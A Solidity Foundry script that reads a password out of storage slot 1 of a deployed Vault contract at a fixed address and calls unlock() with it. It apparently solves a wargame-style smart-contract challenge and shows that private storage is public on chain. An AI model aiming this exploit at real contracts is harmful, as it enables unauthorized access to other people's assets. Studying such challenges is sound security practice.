// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract FindStorageSlotValue is Script {
    address public constant VAULT_CONTRACT_ADDRESS =
        0x63627C3652C9F90084CF1bFDe01c2C6e66774070;

    uint256 public slot = 1;

    function run() external {
        vm.startBroadcast();
        bytes32 key = bytes32(vm.load(VAULT_CONTRACT_ADDRESS, bytes32(slot)));

        Vault(VAULT_CONTRACT_ADDRESS).unlock(key);
        console.logBytes32(key);
        vm.stopBroadcast();
    }
}
